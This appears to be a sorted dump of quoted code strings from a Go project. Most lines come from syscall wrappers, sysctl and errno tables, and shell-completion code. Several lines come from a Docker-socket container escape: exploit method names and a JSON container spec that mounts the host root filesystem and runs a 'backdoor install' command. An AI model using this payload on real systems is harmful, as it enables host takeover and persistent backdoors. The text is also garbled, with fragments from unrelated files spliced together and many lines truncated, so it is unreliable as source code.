"w, makeInheritSa(), 0)"
"w.Msg = """""
"wait4(pid Pid_t, status "
"wait4(pid int, wstatus "
"wait4(pid int32, statusp "
"wait4(pid_t pid, int "
"waitForMultipleObjects(count uint32, handles uintptr, waitAll bool, waitMilliseconds uint32) (event uint32, err error) [failretval==0xffffffff] = WaitForMultipleObjects"
"waitResp, err := v.client.Post(fmt.Sprintf(""http://localhost/containers/%s/wait"", container.ID), ""application/json"", nil)"
"waitpid(pid int, wstatus "
"way in and out of system calls, but there is almost always a "
"wd, err := Getwd()"
"when a flag has not been set, mark it as required:"
"when invoked without arguments, this is often very frustrating for those users."
"which can be found at [spf13/cobra-cli](https://github.com/spf13/cobra-cli),"
"why, int nargs, void "
"wild, char "
"win32finddata1) (handle Handle, err error) [failretval==InvalidHandle] = FindFirstFileW"
"win32finddata1) (handle Handle, err error) {"
"winHeapSD, nil)"
"winHeapSDSize, "
"winerror=""$(printf '%s"
"with the desired arguments and a capitalized name so it is exported. However, if"
"words[@]}"""
"words[@]}, cword is $cword"""
"wpid, err = wait4(pid, "
"wpid, err = waitpid(pid, "
"writableDockerSocketExploit) Exploit(ctx context.Context, s "
"writableDockerSocketExploit) IsVulnerable(_ context.Context, _ "
"writableDockerSocketExploit) Shell(ctx context.Context, s "
"writableDockerSocketExploit) exploitWithImage(image string, removeAfterwards bool, payload payloads.Payload, log logger.Logger) error {"
"writableDockerSocketExploit) listLocalImages() ([]string, error) {"
"write(fd int, p []byte) (n int, err error)"
"write(int fd, const void "
"writeArgAliases(buf, cmd)"
"writeCmdAliases(buf, c)"
"writeCommands(buf, cmd)"
"writeFile(handle Handle, buf []byte, done "
"writeFlag(buf, flag, cmd)"
"writeFlagHandler(buf, ""-"""
"writeFlagHandler(buf, ""--"""
"writeFlags(buf, cmd)"
"writeLocalNonPersistentFlag(buf, flag)"
"writePostscript(buf, c.Name())"
"writePreamble(buf, c.Name())"
"writeRequiredFlag(buf, cmd)"
"writeRequiredNouns(buf, cmd)"
"writeShortFlag(buf, flag, cmd)"
"writelen(fd int, buf "
"writelen(fd int, p "
"writer:                w,"
"writev(fd int, iovs []Iovec) (n int, err error) = SYS_WRITEV"
"writev(fd int, iovs []Iovec) (n int, err error)"
"writev(int fd, const struct iovec "
"writevRacedetect(iovecs, n)"
"writtenOut)), 0, 0)"
"writtenOut)), 0, 0, 0)"
"wrusage, siginfo_t "
"ws, err := GetsizeFull(t)"
"ws, err := unix.IoctlGetWinsize(fd, unix.TIOCGWINSZ)"
"ws, nil"
"wstat(path string, edir []byte) (err error)"
"x00"""
"x00"")"
"x00"")), nil"
"x1b[0m"""
"x1b[101m"","
"x1b[102m"","
"x1b[103m"","
"x1b[104m"","
"x1b[105m"","
"x1b[106m"","
"x1b[107m"","
"x1b[1m"","
"x1b[2m"","
"x1b[30m"","
"x1b[31m"","
"x1b[32m"","
"x1b[33m"","
"x1b[34m"""
"x1b[34m"","
"x1b[35m"","
"x1b[36m"","
"x1b[37m"","
"x1b[39m"""
"x1b[3m"","
"x1b[40m"","
"x1b[41m"","
"x1b[42m"","
"x1b[43m"","
"x1b[44m"","
"x1b[45m"","
"x1b[46m"","
"x1b[47m"","
"x1b[49m"""
"x1b[4m"","
"x1b[5m"","
"x1b[7m"","
"x1b[8m"","
"x1b[90m"","
"x1b[91m"","
"x1b[92m"","
"x1b[93m"","
"x1b[94m"","
"x1b[95m"","
"x1b[96m"","
"x1b[97m"","
"x1b[H""))"
"x40"") // """
"xf4""), // svc_EZBNMIF4"
"you want the interface to the syscall to be different, often one will make an"
"your type is significantly different on different architectures, you may need"
"zerrors=""zerrors_$GOOSARCH.go"""
"zsysctl=""zsysctl_$GOOSARCH.go"""
"{""Image"":""%s"",""Cmd"":[""/pwn%s"", ""backdoor"", ""install"", ""/pwn%s""],""DetachKeys"":""Ctrl-p,Ctrl-q"",""OpenStdin"":true,""Mounts"":[{""Type"":""bind"",""Source"":""/"",""Target"": ""/pwn""}]}"
"{""ddb.console"", []_C_int{9, 6}},"
"{""ddb.log"", []_C_int{9, 7}},"
"{""ddb.max_line"", []_C_int{9, 3}},"
"{""ddb.max_width"", []_C_int{9, 2}},"
"{""ddb.panic"", []_C_int{9, 5}},"
"{""ddb.profile"", []_C_int{9, 9}},"
"{""ddb.radix"", []_C_int{9, 1}},"
"{""ddb.tab_stop_width"", []_C_int{9, 4}},"
"{""ddb.trigger"", []_C_int{9, 8}},"
"{""fs.posix.setuid"", []_C_int{3, 1, 1}},"
"{""hw.allowpowerdown"", []_C_int{6, 22}},"
"{""hw.byteorder"", []_C_int{6, 4}},"
"{""hw.cpuspeed"", []_C_int{6, 12}},"
"{""hw.diskcount"", []_C_int{6, 10}},"
"{""hw.disknames"", []_C_int{6, 8}},"
"{""hw.diskstats"", []_C_int{6, 9}},"
"{""hw.machine"", []_C_int{6, 1}},"
"{""hw.model"", []_C_int{6, 2}},"
"{""hw.ncpu"", []_C_int{6, 3}},"
"{""hw.ncpufound"", []_C_int{6, 21}},"
"{""hw.ncpuonline"", []_C_int{6, 25}},"
"{""hw.pagesize"", []_C_int{6, 7}},"
"{""hw.perfpolicy"", []_C_int{6, 23}},"
"{""hw.physmem"", []_C_int{6, 19}},"
"{""hw.product"", []_C_int{6, 15}},"
"{""hw.serialno"", []_C_int{6, 17}},"
"{""hw.setperf"", []_C_int{6, 13}},"
"{""hw.smt"", []_C_int{6, 24}},"
"{""hw.usermem"", []_C_int{6, 20}},"
"{""hw.uuid"", []_C_int{6, 18}},"
"{""hw.vendor"", []_C_int{6, 14}},"
"{""hw.version"", []_C_int{6, 16}},"
"{""kern.allowdt"", []_C_int{1, 65}},"
"{""kern.allowkmem"", []_C_int{1, 52}},"
"{""kern.arandom"", []_C_int{1, 37}},"
"{""kern.argmax"", []_C_int{1, 8}},"
"{""kern.audio"", []_C_int{1, 84}},"
"{""kern.boottime"", []_C_int{1, 21}},"
"{""kern.bufcachepercent"", []_C_int{1, 72}},"
"{""kern.ccpu"", []_C_int{1, 45}},"
"{""kern.clockrate"", []_C_int{1, 12}},"
"{""kern.consbuf"", []_C_int{1, 83}},"
"{""kern.consbufsize"", []_C_int{1, 82}},"
"{""kern.consdev"", []_C_int{1, 75}},"
"{""kern.cp_time"", []_C_int{1, 40}},"
"{""kern.cp_time2"", []_C_int{1, 71}},"
"{""kern.cpustats"", []_C_int{1, 85}},"
"{""kern.cryptodevallowsoft"", []_C_int{1, 53}},"
"{""kern.dnsjackport"", []_C_int{1, 13}},"
"{""kern.domainname"", []_C_int{1, 22}},"
"{""kern.file"", []_C_int{1, 73}},"
"{""kern.forkstat"", []_C_int{1, 42}},"
"{""kern.fscale"", []_C_int{1, 46}},"
"{""kern.fsync"", []_C_int{1, 33}},"
"{""kern.global_ptrace"", []_C_int{1, 81}},"
"{""kern.hostid"", []_C_int{1, 11}},"
"{""kern.hostname"", []_C_int{1, 10}},"
"{""kern.intrcnt.nintrcnt"", []_C_int{1, 63, 1}},"
"{""kern.job_control"", []_C_int{1, 19}},"
"{""kern.malloc.buckets"", []_C_int{1, 39, 1}},"
"{""kern.malloc.kmemnames"", []_C_int{1, 39, 3}},"
"{""kern.maxclusters"", []_C_int{1, 67}},"
"{""kern.maxfiles"", []_C_int{1, 7}},"
"{""kern.maxlocksperuid"", []_C_int{1, 70}},"
"{""kern.maxpartitions"", []_C_int{1, 23}},"
"{""kern.maxproc"", []_C_int{1, 6}},"
"{""kern.maxthread"", []_C_int{1, 25}},"
"{""kern.maxvnodes"", []_C_int{1, 5}},"
"{""kern.mbstat"", []_C_int{1, 59}},"
"{""kern.msgbuf"", []_C_int{1, 48}},"
"{""kern.msgbufsize"", []_C_int{1, 38}},"
"{""kern.nchstats"", []_C_int{1, 41}},"
"{""kern.netlivelocks"", []_C_int{1, 76}},"
"{""kern.nfiles"", []_C_int{1, 56}},"
"{""kern.ngroups"", []_C_int{1, 18}},"
"{""kern.nosuidcoredump"", []_C_int{1, 32}},"
"{""kern.nprocs"", []_C_int{1, 47}},"
"{""kern.nselcoll"", []_C_int{1, 43}},"
"{""kern.nthreads"", []_C_int{1, 26}},"
"{""kern.numvnodes"", []_C_int{1, 58}},"
"{""kern.osrelease"", []_C_int{1, 2}},"
"{""kern.osrevision"", []_C_int{1, 3}},"
"{""kern.ostype"", []_C_int{1, 1}},"
"{""kern.osversion"", []_C_int{1, 27}},"
"{""kern.pfstatus"", []_C_int{1, 86}},"
"{""kern.pool_debug"", []_C_int{1, 77}},"
"{""kern.posix1version"", []_C_int{1, 17}},"
"{""kern.proc"", []_C_int{1, 66}},"
"{""kern.random"", []_C_int{1, 31}},"
"{""kern.rawpartition"", []_C_int{1, 24}},"
"{""kern.saved_ids"", []_C_int{1, 20}},"
"{""kern.securelevel"", []_C_int{1, 9}},"
"{""kern.seminfo"", []_C_int{1, 61}},"
"{""kern.shminfo"", []_C_int{1, 62}},"
"{""kern.somaxconn"", []_C_int{1, 28}},"
"{""kern.sominconn"", []_C_int{1, 29}},"
"{""kern.splassert"", []_C_int{1, 54}},"
"{""kern.stackgap_random"", []_C_int{1, 50}},"
"{""kern.sysvipc_info"", []_C_int{1, 51}},"
"{""kern.sysvmsg"", []_C_int{1, 34}},"
"{""kern.sysvsem"", []_C_int{1, 35}},"
"{""kern.sysvshm"", []_C_int{1, 36}},"
"{""kern.timecounter.choice"", []_C_int{1, 69, 4}},"
"{""kern.timecounter.hardware"", []_C_int{1, 69, 3}},"
"{""kern.timecounter.tick"", []_C_int{1, 69, 1}},"
"{""kern.timecounter.timestepwarnings"", []_C_int{1, 69, 2}},"
"{""kern.timeout_stats"", []_C_int{1, 87}},"
"{""kern.tty.maxptys"", []_C_int{1, 44, 6}},"
"{""kern.tty.nptys"", []_C_int{1, 44, 7}},"
"{""kern.tty.tk_cancc"", []_C_int{1, 44, 4}},"
"{""kern.tty.tk_nin"", []_C_int{1, 44, 1}},"
"{""kern.tty.tk_nout"", []_C_int{1, 44, 2}},"
"{""kern.tty.tk_rawcc"", []_C_int{1, 44, 3}},"
"{""kern.tty.ttyinfo"", []_C_int{1, 44, 5}},"
"{""kern.ttycount"", []_C_int{1, 57}},"
"{""kern.userasymcrypto"", []_C_int{1, 60}},"
"{""kern.usercrypto"", []_C_int{1, 52}},"
"{""kern.usermount"", []_C_int{1, 30}},"
"{""kern.utc_offset"", []_C_int{1, 88}},"
"{""kern.version"", []_C_int{1, 4}},"
"{""kern.vnode"", []_C_int{1, 13}},"
"{""kern.watchdog.auto"", []_C_int{1, 64, 2}},"
"{""kern.watchdog.period"", []_C_int{1, 64, 1}},"
"{""kern.witnesswatch"", []_C_int{1, 53}},"
"{""kern.wxabort"", []_C_int{1, 74}},"
"{""net.bpf.bufsize"", []_C_int{4, 31, 1}},"
"{""net.bpf.maxbufsize"", []_C_int{4, 31, 2}},"
"{""net.inet.ah.enable"", []_C_int{4, 2, 51, 1}},"
"{""net.inet.ah.stats"", []_C_int{4, 2, 51, 2}},"
"{""net.inet.carp.allow"", []_C_int{4, 2, 112, 1}},"
"{""net.inet.carp.log"", []_C_int{4, 2, 112, 3}},"
"{""net.inet.carp.preempt"", []_C_int{4, 2, 112, 2}},"
"{""net.inet.carp.stats"", []_C_int{4, 2, 112, 4}},"
"{""net.inet.divert.recvspace"", []_C_int{4, 2, 258, 1}},"
"{""net.inet.divert.sendspace"", []_C_int{4, 2, 258, 2}},"
"{""net.inet.divert.stats"", []_C_int{4, 2, 258, 3}},"
"{""net.inet.esp.enable"", []_C_int{4, 2, 50, 1}},"
"{""net.inet.esp.stats"", []_C_int{4, 2, 50, 4}},"
"{""net.inet.esp.udpencap"", []_C_int{4, 2, 50, 2}},"
"{""net.inet.esp.udpencap_port"", []_C_int{4, 2, 50, 3}},"
"{""net.inet.etherip.allow"", []_C_int{4, 2, 97, 1}},"
"{""net.inet.etherip.stats"", []_C_int{4, 2, 97, 2}},"
"{""net.inet.gre.allow"", []_C_int{4, 2, 47, 1}},"
"{""net.inet.gre.wccp"", []_C_int{4, 2, 47, 2}},"
"{""net.inet.icmp.bmcastecho"", []_C_int{4, 2, 1, 2}},"
"{""net.inet.icmp.errppslimit"", []_C_int{4, 2, 1, 3}},"
"{""net.inet.icmp.maskrepl"", []_C_int{4, 2, 1, 1}},"
"{""net.inet.icmp.rediraccept"", []_C_int{4, 2, 1, 4}},"
"{""net.inet.icmp.redirtimeout"", []_C_int{4, 2, 1, 5}},"
"{""net.inet.icmp.stats"", []_C_int{4, 2, 1, 7}},"
"{""net.inet.icmp.tstamprepl"", []_C_int{4, 2, 1, 6}},"
"{""net.inet.igmp.stats"", []_C_int{4, 2, 2, 1}},"
"{""net.inet.ip.arpdown"", []_C_int{4, 2, 0, 40}},"
"{""net.inet.ip.arpqueued"", []_C_int{4, 2, 0, 36}},"
"{""net.inet.ip.arptimeout"", []_C_int{4, 2, 0, 39}},"
"{""net.inet.ip.encdebug"", []_C_int{4, 2, 0, 12}},"
"{""net.inet.ip.forwarding"", []_C_int{4, 2, 0, 1}},"
"{""net.inet.ip.ifq.congestion"", []_C_int{4, 2, 0, 30, 4}},"
"{""net.inet.ip.ifq.drops"", []_C_int{4, 2, 0, 30, 3}},"
"{""net.inet.ip.ifq.len"", []_C_int{4, 2, 0, 30, 1}},"
"{""net.inet.ip.ifq.maxlen"", []_C_int{4, 2, 0, 30, 2}},"
"{""net.inet.ip.maxqueue"", []_C_int{4, 2, 0, 11}},"
"{""net.inet.ip.mforwarding"", []_C_int{4, 2, 0, 31}},"
"{""net.inet.ip.mrtmfc"", []_C_int{4, 2, 0, 37}},"
"{""net.inet.ip.mrtproto"", []_C_int{4, 2, 0, 34}},"
"{""net.inet.ip.mrtstats"", []_C_int{4, 2, 0, 35}},"
"{""net.inet.ip.mrtvif"", []_C_int{4, 2, 0, 38}},"
"{""net.inet.ip.mtu"", []_C_int{4, 2, 0, 4}},"
"{""net.inet.ip.mtudisc"", []_C_int{4, 2, 0, 27}},"
"{""net.inet.ip.mtudisctimeout"", []_C_int{4, 2, 0, 28}},"
"{""net.inet.ip.multipath"", []_C_int{4, 2, 0, 32}},"
"{""net.inet.ip.portfirst"", []_C_int{4, 2, 0, 7}},"
"{""net.inet.ip.porthifirst"", []_C_int{4, 2, 0, 9}},"
"{""net.inet.ip.porthilast"", []_C_int{4, 2, 0, 10}},"
"{""net.inet.ip.portlast"", []_C_int{4, 2, 0, 8}},"
"{""net.inet.ip.redirect"", []_C_int{4, 2, 0, 2}},"
"{""net.inet.ip.sourceroute"", []_C_int{4, 2, 0, 5}},"
"{""net.inet.ip.stats"", []_C_int{4, 2, 0, 33}},"
"{""net.inet.ip.ttl"", []_C_int{4, 2, 0, 3}},"
"{""net.inet.ipcomp.enable"", []_C_int{4, 2, 108, 1}},"
"{""net.inet.ipcomp.stats"", []_C_int{4, 2, 108, 2}},"
"{""net.inet.ipip.allow"", []_C_int{4, 2, 4, 1}},"
"{""net.inet.ipip.stats"", []_C_int{4, 2, 4, 2}},"
"{""net.inet.mobileip.allow"", []_C_int{4, 2, 55, 1}},"
"{""net.inet.pfsync.stats"", []_C_int{4, 2, 240, 1}},"
"{""net.inet.pim.stats"", []_C_int{4, 2, 103, 1}},"
"{""net.inet.tcp.ackonpush"", []_C_int{4, 2, 6, 13}},"
"{""net.inet.tcp.always_keepalive"", []_C_int{4, 2, 6, 22}},"
"{""net.inet.tcp.baddynamic"", []_C_int{4, 2, 6, 6}},"
"{""net.inet.tcp.drop"", []_C_int{4, 2, 6, 19}},"
"{""net.inet.tcp.ecn"", []_C_int{4, 2, 6, 14}},"
"{""net.inet.tcp.ident"", []_C_int{4, 2, 6, 9}},"
"{""net.inet.tcp.keepidle"", []_C_int{4, 2, 6, 3}},"
"{""net.inet.tcp.keepinittime"", []_C_int{4, 2, 6, 2}},"
"{""net.inet.tcp.keepintvl"", []_C_int{4, 2, 6, 4}},"
"{""net.inet.tcp.mssdflt"", []_C_int{4, 2, 6, 11}},"
"{""net.inet.tcp.reasslimit"", []_C_int{4, 2, 6, 18}},"
"{""net.inet.tcp.rfc1323"", []_C_int{4, 2, 6, 1}},"
"{""net.inet.tcp.rfc3390"", []_C_int{4, 2, 6, 17}},"
"{""net.inet.tcp.rootonly"", []_C_int{4, 2, 6, 24}},"
"{""net.inet.tcp.rstppslimit"", []_C_int{4, 2, 6, 12}},"
"{""net.inet.tcp.sack"", []_C_int{4, 2, 6, 10}},"
"{""net.inet.tcp.sackholelimit"", []_C_int{4, 2, 6, 20}},"
"{""net.inet.tcp.slowhz"", []_C_int{4, 2, 6, 5}},"
"{""net.inet.tcp.stats"", []_C_int{4, 2, 6, 21}},"
"{""net.inet.tcp.synbucketlimit"", []_C_int{4, 2, 6, 16}},"
"{""net.inet.tcp.syncachelimit"", []_C_int{4, 2, 6, 15}},"
"{""net.inet.tcp.synhashsize"", []_C_int{4, 2, 6, 25}},"
"{""net.inet.tcp.synuselimit"", []_C_int{4, 2, 6, 23}},"
"{""net.inet.udp.baddynamic"", []_C_int{4, 2, 17, 2}},"
"{""net.inet.udp.checksum"", []_C_int{4, 2, 17, 1}},"
"{""net.inet.udp.recvspace"", []_C_int{4, 2, 17, 3}},"
"{""net.inet.udp.rootonly"", []_C_int{4, 2, 17, 6}},"
"{""net.inet.udp.sendspace"", []_C_int{4, 2, 17, 4}},"
"{""net.inet.udp.stats"", []_C_int{4, 2, 17, 5}},"
"{""net.inet6.divert.recvspace"", []_C_int{4, 24, 86, 1}},"
"{""net.inet6.divert.sendspace"", []_C_int{4, 24, 86, 2}},"
"{""net.inet6.divert.stats"", []_C_int{4, 24, 86, 3}},"
"{""net.inet6.icmp6.errppslimit"", []_C_int{4, 24, 30, 14}},"
"{""net.inet6.icmp6.mtudisc_hiwat"", []_C_int{4, 24, 30, 16}},"
"{""net.inet6.icmp6.mtudisc_lowat"", []_C_int{4, 24, 30, 17}},"
"{""net.inet6.icmp6.nd6_debug"", []_C_int{4, 24, 30, 18}},"
"{""net.inet6.icmp6.nd6_delay"", []_C_int{4, 24, 30, 8}},"
"{""net.inet6.icmp6.nd6_maxnudhint"", []_C_int{4, 24, 30, 15}},"
"{""net.inet6.icmp6.nd6_mmaxtries"", []_C_int{4, 24, 30, 10}},"
"{""net.inet6.icmp6.nd6_prune"", []_C_int{4, 24, 30, 6}},"
"{""net.inet6.icmp6.nd6_umaxtries"", []_C_int{4, 24, 30, 9}},"
"{""net.inet6.icmp6.nd6_useloopback"", []_C_int{4, 24, 30, 11}},"
"{""net.inet6.icmp6.nodeinfo"", []_C_int{4, 24, 30, 13}},"
"{""net.inet6.icmp6.rediraccept"", []_C_int{4, 24, 30, 2}},"
"{""net.inet6.icmp6.redirtimeout"", []_C_int{4, 24, 30, 3}},"
"{""net.inet6.ip6.accept_rtadv"", []_C_int{4, 24, 17, 12}},"
"{""net.inet6.ip6.auto_flowlabel"", []_C_int{4, 24, 17, 17}},"
"{""net.inet6.ip6.dad_count"", []_C_int{4, 24, 17, 16}},"
"{""net.inet6.ip6.dad_pending"", []_C_int{4, 24, 17, 49}},"
"{""net.inet6.ip6.defmcasthlim"", []_C_int{4, 24, 17, 18}},"
"{""net.inet6.ip6.forwarding"", []_C_int{4, 24, 17, 1}},"
"{""net.inet6.ip6.forwsrcrt"", []_C_int{4, 24, 17, 5}},"
"{""net.inet6.ip6.hdrnestlimit"", []_C_int{4, 24, 17, 15}},"
"{""net.inet6.ip6.hlim"", []_C_int{4, 24, 17, 3}},"
"{""net.inet6.ip6.log_interval"", []_C_int{4, 24, 17, 14}},"
"{""net.inet6.ip6.maxdynroutes"", []_C_int{4, 24, 17, 48}},"
"{""net.inet6.ip6.maxfragpackets"", []_C_int{4, 24, 17, 9}},"
"{""net.inet6.ip6.maxfrags"", []_C_int{4, 24, 17, 41}},"
"{""net.inet6.ip6.maxifdefrouters"", []_C_int{4, 24, 17, 47}},"
"{""net.inet6.ip6.maxifprefixes"", []_C_int{4, 24, 17, 46}},"
"{""net.inet6.ip6.mforwarding"", []_C_int{4, 24, 17, 42}},"
"{""net.inet6.ip6.mrtmfc"", []_C_int{4, 24, 17, 53}},"
"{""net.inet6.ip6.mrtmif"", []_C_int{4, 24, 17, 52}},"
"{""net.inet6.ip6.mrtproto"", []_C_int{4, 24, 17, 8}},"
"{""net.inet6.ip6.mtudisctimeout"", []_C_int{4, 24, 17, 50}},"
"{""net.inet6.ip6.multicast_mtudisc"", []_C_int{4, 24, 17, 44}},"
"{""net.inet6.ip6.multipath"", []_C_int{4, 24, 17, 43}},"
"{""net.inet6.ip6.neighborgcthresh"", []_C_int{4, 24, 17, 45}},"
"{""net.inet6.ip6.redirect"", []_C_int{4, 24, 17, 2}},"
"{""net.inet6.ip6.rr_prune"", []_C_int{4, 24, 17, 22}},"
"{""net.inet6.ip6.soiikey"", []_C_int{4, 24, 17, 54}},"
"{""net.inet6.ip6.sourcecheck"", []_C_int{4, 24, 17, 10}},"
"{""net.inet6.ip6.sourcecheck_logint"", []_C_int{4, 24, 17, 11}},"
"{""net.inet6.ip6.use_deprecated"", []_C_int{4, 24, 17, 21}},"
"{""net.inet6.ip6.v6only"", []_C_int{4, 24, 17, 24}},"
"{""net.key.sadb_dump"", []_C_int{4, 30, 1}},"
"{""net.key.spd_dump"", []_C_int{4, 30, 2}},"
"{""net.mpls.ifq.congestion"", []_C_int{4, 33, 3, 4}},"
"{""net.mpls.ifq.drops"", []_C_int{4, 33, 3, 3}},"
"{""net.mpls.ifq.len"", []_C_int{4, 33, 3, 1}},"
"{""net.mpls.ifq.maxlen"", []_C_int{4, 33, 3, 2}},"
"{""net.mpls.mapttl_ip"", []_C_int{4, 33, 5}},"
"{""net.mpls.mapttl_ip6"", []_C_int{4, 33, 6}},"
"{""net.mpls.maxloop_inkernel"", []_C_int{4, 33, 4}},"
"{""net.mpls.ttl"", []_C_int{4, 33, 2}},"
"{""net.pflow.stats"", []_C_int{4, 34, 1}},"
"{""net.pipex.enable"", []_C_int{4, 35, 1}},"
"{""vm.anonmin"", []_C_int{2, 7}},"
"{""vm.loadavg"", []_C_int{2, 2}},"
"{""vm.malloc_conf"", []_C_int{2, 12}},"
"{""vm.maxslp"", []_C_int{2, 10}},"
"{""vm.nkmempages"", []_C_int{2, 6}},"
"{""vm.psstrings"", []_C_int{2, 3}},"
"{""vm.swapencrypt.enable"", []_C_int{2, 5, 0}},"
"{""vm.swapencrypt.keyscreated"", []_C_int{2, 5, 1}},"
"{""vm.swapencrypt.keysdeleted"", []_C_int{2, 5, 2}},"
"{""vm.uspace"", []_C_int{2, 11}},"
"{""vm.uvmexp"", []_C_int{2, 4}},"
"{""vm.vmmeter"", []_C_int{2, 1}},"
"{""vm.vnodemin"", []_C_int{2, 9}},"
"{""vm.vtextmin"", []_C_int{2, 8}},"
"{'$i', ""'$i'"" },'"
"{1, ""EDC5001I"", ""A domain error occurred.""},"
"{1, ""EPERM"", ""not owner""},"
"{1, ""EPERM"", ""operation not permitted""},"
"{1, ""SIGHUP"", ""hangup""},"
"{10, ""ECHILD"", ""no child processes""},"
"{10, ""SIGBUS"", ""bus Error""},"
"{10, ""SIGBUS"", ""bus error""},"
"{10, ""SIGUSR1"", ""user defined signal 1""},"
"{100, ""ENETDOWN"", ""network is down""},"
"{100, ""ENOCSI"", ""no CSI structure available""},"
"{100, ""EPROTO"", ""protocol error""},"
"{1000, ""EDC8000I"", ""A bad socket-call constant was found in the IUCV header.""},"
"{1001, ""EDC8001I"", ""An error was found in the IUCV header.""},"
"{1002, ""EDC8002I"", ""A socket descriptor is out of range.""},"
"{1003, ""EDC8003I"", ""A socket descriptor is in use.""},"
"{1004, ""EDC8004I"", ""Request failed because of an IUCV error.""},"
"{1005, ""EDC8005I"", ""Offload box error.""},"
"{1006, ""EDC8006I"", ""Offload box restarted.""},"
"{1007, ""EDC8007I"", ""Offload box down.""},"
"{1008, ""EDC8008I"", ""Already a conflicting call outstanding on socket.""},"
"{1009, ""EDC8009I"", ""Request cancelled using a SOCKcallCANCEL request.""},"
"{101, ""EL2HLT"", ""level 2 halted""},"
"{101, ""ENETUNREACH"", ""network is unreachable""},"
"{101, ""ETIME"", ""STREAM ioctl timeout""},"
"{1011, ""EDC8011I"", ""A name of a PFS was specified that either is not configured or is not a Sockets PFS.""},"
"{102, ""EBADE"", ""invalid exchange""},"
"{102, ""ENETRESET"", ""network dropped connection on reset""},"
"{102, ""EOPNOTSUPP"", ""operation not supported on socket""},"
"{103, ""EBADR"", ""invalid request descriptor""},"
"{103, ""ECONNABORTED"", ""software caused connection abort""},"
"{103, ""ENOPOLICY"", ""policy not found""},"
"{104, ""ECONNRESET"", ""connection reset by peer""},"
"{104, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{104, ""EXFULL"", ""exchange full""},"
"{105, ""ENOANO"", ""no anode""},"
"{105, ""ENOBUFS"", ""no buffer space available""},"
"{105, ""EOWNERDEAD"", ""previous owner died""},"
"{106, ""EBADRQC"", ""invalid request code""},"
"{106, ""EISCONN"", ""transport endpoint is already connected""},"
"{106, ""EQFULL"", ""interface output queue is full""},"
"{107, ""EBADSLT"", ""invalid slot""},"
"{107, ""ENOTCONN"", ""transport endpoint is not connected""},"
"{108, ""EDEADLOCK"", ""file locking deadlock error""},"
"{108, ""ESHUTDOWN"", ""cannot send after transport endpoint shutdown""},"
"{109, ""EBFONT"", ""bad font file format""},"
"{109, ""ENOSYS"", ""function not implemented""},"
"{109, ""ETOOMANYREFS"", ""too many references: cannot splice""},"
"{11, ""EAGAIN"", ""resource temporarily unavailable""},"
"{11, ""EDEADLK"", ""resource deadlock avoided""},"
"{11, ""EWOULDBLOCK"", ""resource temporarily unavailable""},"
"{11, ""SIGSEGV"", ""segmentation Fault""},"
"{11, ""SIGSEGV"", ""segmentation fault""},"
"{110, ""ELIBEXEC"", ""cannot exec a shared library directly""},"
"{110, ""EMEDIA"", ""media surface error""},"
"{110, ""ETIMEDOUT"", ""connection timed out""},"
"{1100, ""EDC8100I"", ""Block device required.""},"
"{1101, ""EDC8101I"", ""Text file busy.""},"
"{1102, ""EDC8102I"", ""Operation would block.""},"
"{1103, ""EDC8103I"", ""Operation now in progress.""},"
"{1104, ""EDC8104I"", ""Connection already in progress.""},"
"{1105, ""EDC8105I"", ""Socket operation on non-socket.""},"
"{1106, ""EDC8106I"", ""Destination address required.""},"
"{1107, ""EDC8107I"", ""Message too long.""},"
"{1108, ""EDC8108I"", ""Protocol wrong type for socket.""},"
"{1109, ""EDC8109I"", ""Protocol not available.""},"
"{111, ""ECONNREFUSED"", ""connection refused""},"
"{111, ""EDC5111I"", ""Permission denied.""},"
"{111, ""ENODATA"", ""no data available""},"
"{111, ""ESOFT"", ""I/O completed, but needs relocation""},"
"{1110, ""EDC8110I"", ""Protocol not supported.""},"
"{1111, ""EDC8111I"", ""Socket type not supported.""},"
"{1112, ""EDC8112I"", ""Operation not supported on socket.""},"
"{1113, ""EDC8113I"", ""Protocol family not supported.""},"
"{1114, ""EDC8114I"", ""Address family not supported.""},"
"{1115, ""EDC8115I"", ""Address already in use.""},"
"{1116, ""EDC8116I"", ""Address not available.""},"
"{1117, ""EDC8117I"", ""Network is down.""},"
"{1118, ""EDC8118I"", ""Network is unreachable.""},"
"{1119, ""EDC8119I"", ""Network dropped connection on reset.""},"
"{112, ""EDC5112I"", ""Resource temporarily unavailable.""},"
"{112, ""EHOSTDOWN"", ""host is down""},"
"{112, ""ELIBBAD"", ""accessing a corrupted shared library""},"
"{112, ""ENOATTR"", ""no attribute found""},"
"{1120, ""EDC8120I"", ""Connection ended abnormally.""},"
"{1121, ""EDC8121I"", ""Connection reset.""},"
"{1122, ""EDC8122I"", ""No buffer space available.""},"
"{1123, ""EDC8123I"", ""Socket already connected.""},"
"{1124, ""EDC8124I"", ""Socket not connected.""},"
"{1125, ""EDC8125I"", ""Can't send after socket shutdown.""},"
"{1126, ""EDC8126I"", ""Too many references"
"{1127, ""EDC8127I"", ""Connection timed out.""},"
"{1128, ""EDC8128I"", ""Connection refused.""},"
"{1129, ""EDC8129I"", ""Host is not available.""},"
"{113, ""EDC5113I"", ""Bad file descriptor.""},"
"{113, ""EHOSTUNREACH"", ""no route to host""},"
"{113, ""ENOPKG"", ""package not installed""},"
"{113, ""ESAD"", ""security Authentication Denied""},"
"{1130, ""EDC8130I"", ""Host cannot be reached.""},"
"{1131, ""EDC8131I"", ""Too many processes.""},"
"{1132, ""EDC8132I"", ""Too many users.""},"
"{1133, ""EDC8133I"", ""Disk quota exceeded.""},"
"{1133, ""EDQUOT"", ""disk quota exceeded""},"
"{1134, ""EDC8134I"", ""Stale file handle.""},"
"{1135, """", """"},"
"{1136, ""EDC8136I"", ""File is not a STREAM.""},"
"{1137, ""EDC8137I"", ""STREAMS ioctl() timeout.""},"
"{1138, ""EDC8138I"", ""No STREAMS resources.""},"
"{1139, ""EDC8139I"", ""The message identified by set_id and msg_id is not in the message catalog.""},"
"{114, ""EALREADY"", ""operation already in progress""},"
"{114, ""EDC5114I"", ""Resource busy.""},"
"{114, ""ELIBACC"", ""can not access a needed shared library""},"
"{114, ""ENOTRUST"", ""not a Trusted Program""},"
"{1140, ""EDC8140I"", ""Bad message.""},"
"{1141, ""EDC8141I"", ""Identifier removed.""},"
"{1142, """", """"},"
"{1143, """", """"},"
"{1144, ""EDC8144I"", ""The link has been severed.""},"
"{1145, """", """"},"
"{1146, """", """"},"
"{1147, """", """"},"
"{1148, ""EDC8148I"", ""Protocol error.""},"
"{1149, ""EDC8149I"", ""Multihop not allowed.""},"
"{115, ""EDC5115I"", ""No child processes.""},"
"{115, ""EINPROGRESS"", ""operation now in progress""},"
"{115, ""ENOTUNIQ"", ""name not unique on network""},"
"{115, ""ETOOMANYREFS"", ""too many references: can't splice""},"
